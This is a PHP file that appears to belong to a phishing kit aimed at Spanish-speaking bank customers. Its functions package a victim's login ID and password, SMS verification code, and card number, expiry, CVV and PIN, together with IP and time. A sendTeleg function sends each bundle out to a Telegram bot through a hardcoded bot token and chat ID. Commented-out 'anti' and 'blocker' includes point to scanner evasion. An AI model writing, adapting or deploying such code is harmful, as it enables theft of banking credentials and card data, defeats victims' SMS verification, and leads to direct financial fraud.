<?php
session_start();

$_SESSION['time'] = date('H:i:s d/m/Y');
$_SESSION['ip'] = getUserIP();
$_SESSION['os'] = getOS();
$_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
// require_once('anti1.php');
// require_once('anti2.php');
// require_once('anti3.php');
// require_once('anti4.php');
// require_once('anti5.php');
// require_once('anti6.php');
// require_once('anti7.php');
// require_once('anti8.php');
// require_once('blocker.php');


function getUserIP(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}

function getOS() { 
    global $user_agent;
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    }   
    return $os_platform;
}

function sendTeleg($telegBody){
    $chatId = "-553131621";
    $botToken = "1305093017:AAH-xVi9C1OdeGdBsQwgWePbFxOf6-HzzDA";
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($telegBody)."" );
}


function IniciarSession(){
    $telegBody = '
    [+]━━━【 👤 Iniciar Session 】━━[+]
    [👤 Identificador] = '.$_SESSION['ID'].'
    [📮 CONTRASEÑA] = '.$_SESSION['pin1'].'
    [+]━━━━【 💻 System 】━━━[+]
    [🔍 IP INFO] = http://db-ip.com/'.$_SESSION['ip'].'
    [⏰ TIME/DATE] ='.$_SESSION['time'].'';
    SendTeleg($telegBody);
}

function CodigoSMS(){

    $telegBody = '
    [+]━━━【 💬 SMS = '.$_SESSION['ID'].' 】━━[+]
    [💬 SMS Code]  = '.$_SESSION['verification_code'].'
    [+]━━━━【 💻 System 】━━━[+]
    [🔍 IP INFO] = http://db-ip.com/'.$_SESSION['ip'].'
    [⏰ TIME/DATE] ='.$_SESSION['time'].'';
    SendTeleg($telegBody);
}

function Tarjeta(){

    $telegBody = '
    [+]━━━【 👤 Owner = '.$_SESSION['ID'].' 】━━[+]
    [💳 CC Number]  = '.$_SESSION['ccn'].'
    [💳 EXP Date]  = '.$_SESSION['exp1'].'
    [💳 CVV Code]  = '.$_SESSION['cv'].'
    [💳 7wiPIN]  = '.$_SESSION['pin'].'
    [+]━━━━【 💻 System 】━━━[+]
    [🔍 IP INFO] = http://db-ip.com/'.$_SESSION['ip'].'
    [⏰ TIME/DATE] ='.$_SESSION['time'].'';
    SendTeleg($telegBody);
}

?>
